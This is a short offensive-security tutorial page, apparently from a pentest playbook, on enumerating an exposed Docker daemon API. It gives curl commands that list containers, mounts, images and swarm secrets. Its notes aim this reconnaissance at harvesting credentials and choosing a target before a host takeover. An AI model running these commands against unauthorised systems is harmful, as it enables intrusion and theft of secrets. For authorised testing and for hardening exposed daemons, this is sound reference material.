---
title: "API enumeration: mapping the host through the Docker daemon"
description: "Enumerating a reachable Docker daemon through its API to inventory containers, images, volumes, networks, and secrets, revealing the host layout, running services, and credentials before escalating to a host takeover."
keywords:
  - docker API enumeration
  - docker info
  - docker secrets
  - container inventory
  - reconnaissance
---

# API enumeration

Before taking over, read the daemon. The API inventories everything the engine manages, which maps the host and often hands over credentials directly (environment variables, mounted secrets, swarm secrets).

```bash
H=tcp://<host>:2375
curl -s $H/info | jq '{Name,ServerVersion,OperatingSystem,Swarm}'
curl -s $H/containers/json?all=1 | jq '.[].Names,.[].Mounts'
curl -s $H/images/json | jq '.[].RepoTags'
curl -s $H/secrets | jq '.[].Spec.Name'        # swarm secrets (names)
```

## Exploitation notes

- Container `Env` and `Mounts` routinely expose database passwords, cloud keys, and host paths worth targeting.
- A daemon in a Swarm exposes service and secret metadata, and often the manager role, widening the blast radius to the cluster.
- Enumeration is read-only and quiet; use it to pick the best container or mount before the noisy takeover step.

## References

- [Docker Engine API](https://docs.docker.com/engine/api/)
- [Docker swarm secrets](https://docs.docker.com/engine/swarm/secrets/)
